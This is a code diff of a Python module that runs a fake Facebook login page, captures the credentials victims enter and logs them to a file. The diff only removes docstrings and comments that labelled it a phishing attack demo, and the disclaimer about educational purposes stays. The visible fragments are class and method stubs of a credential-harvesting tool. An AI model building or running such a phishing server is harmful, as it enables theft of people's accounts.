@@ -1,9 +1,6 @@
 """
-Facebook Phishing Server - Social Engineering Attack Demo
-
 This module simulates a phishing attack by hosting a fake Facebook login page.
 When users enter credentials, they are captured and logged to a file.
-Users are then redirected to the real Facebook site.
 
 For educational purposes only - demonstrates how easy it is to create convincing 
 fake login pages and capture user credentials.
@@ -200,8 +197,6 @@ FACEBOOK_LOGIN_HTML = """
 
 
 class FacebookPhishingHandler(BaseHTTPRequestHandler):
-    """HTTP request handler for phishing server"""
-    
     credentials_log = []
     log_file = None
     
@@ -267,8 +262,6 @@ class FacebookPhishingHandler(BaseHTTPRequestHandler):
 
 
 class FacebookPhishing:
-    """Simple Facebook phishing framework for educational purposes"""
-    
     def __init__(self, port=8000):
         self.port = port
         self.server = None
@@ -300,7 +293,6 @@ class FacebookPhishing:
         return self.credentials_file
     
     def start_server(self):
-        """Start the phishing server"""
         try:
             import socket
             FacebookPhishingHandler.credentials_log = []
@@ -322,7 +314,6 @@ class FacebookPhishing:
     
 
     def run_interactive(self):
-        """Interactive mode for phishing server"""
         try:
             cprint("\n=== Facebook Phishing Server ===\n", CYAN)
             
